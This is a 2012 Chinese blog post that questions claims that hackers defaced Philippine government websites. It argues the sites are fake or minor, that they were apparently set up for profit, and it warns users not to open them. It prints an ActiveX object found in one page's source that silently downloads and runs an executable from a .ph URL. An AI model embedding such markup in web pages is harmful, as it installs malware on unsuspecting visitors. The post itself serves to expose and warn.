author: 阿安
comments: true
date: 2012-05-10 15:40:05+00:00
layout: post
slug: cnhacker-the-philippines
title: 菲律宾国防部官网被红客攻陷了？大误！！！
wordpress_id: 383
categories:
- 未分类
tags:
- 红客
- 菲律宾国防部
---

今天听说菲律宾官方网站被黑，于是进去看了看。
发现 http://www.pei.net.ph/ 和 http://lam IT an.gov.ph/ 确实被黑了，显示了中国国旗。
　　
疑点1.
　　我们进行了GOOGLE搜索和百度搜索，发现没有任何搜索引擎以前的收录记录，试想一个国家的网站，访问量应该很大，而且从这个网站运作，应该就被搜索引擎收录过，我们发现了上次快照更新时间已经是昨天了。那么，一个国家的机要网站，在发现自己被黑后一天都没人处理，难道他们国家没有技术人员了吗？<!-- more -->
　　
疑点2.
　　我们通过查询了源代码和主机地址，发现网站http://lamitan.gov.ph/服务器放置地在美国。
　　然后该网站还被挂了马。试想自己黑了给那么多华人看，攻击的人需要挂马害自己人吗，显示这个事情有猫腻。我们查看了源文件，发现了这样一段代码。

    
    
    <object classid="CLSID:c1b7e532-3ecb-4e9e-bb3a-2951ffe67c61" width="0" codebase="*ActiveX.cab#Version=1,0,0,1" id="*ActiveX1" height="0">
     
    <param name="propProgressbackground" value="#bccee8">
     
    <param name="propTextbackground" value="#f7f8fc">
     
    <param name="propBarColor" value="#df0203">
     
    <param name="propTextColor" value="#000000">
     
    <param name="propWidth" value="0">
     
    <param name="propHeight" value="0">
     
    <param name="propDownloadUrl" value="http://www.sulu.gov.ph/admin/cal/135pk.exe">
     
    <param name="propPostdownloadAction" value="run">
     
    <param name="propInstallCompleteUrl" value="">
     
    <param name="propbrowserRedirectUrl" value="">
     
    <param name="propVerbose" value="0">
     
    <param name="propInterrupt" value="0">
     
    </object>
    



疑点3.
　　下载这个135pk.exe文件 上传到了查毒网，全部显示为病毒。而且如果是菲律宾官方挂的，也不用自动隐藏下载打开吧，文件有350KB 也不像是什么插件之类的。攻击的网站也不是菲律宾政府官网，而真正的官网应该是： www.gov.ph
　　
　　然后我们在网上查到了.ph的菲律宾域名80元即可注册购买，因此。该事件在没有得到论证以前请没有经验的用户不要去打开。被钓鱼就麻烦了!
　　
　　以上三个疑点说明 有人故意做了假网站，跟随菲律宾能源网站被黑一事在自己谋利。谋什么利呢 ，我们进群发现群管理不断发内容招人。招学员之类的。
        这个.....不用继续往下说了吧?

-----------------------
本文转自银河系
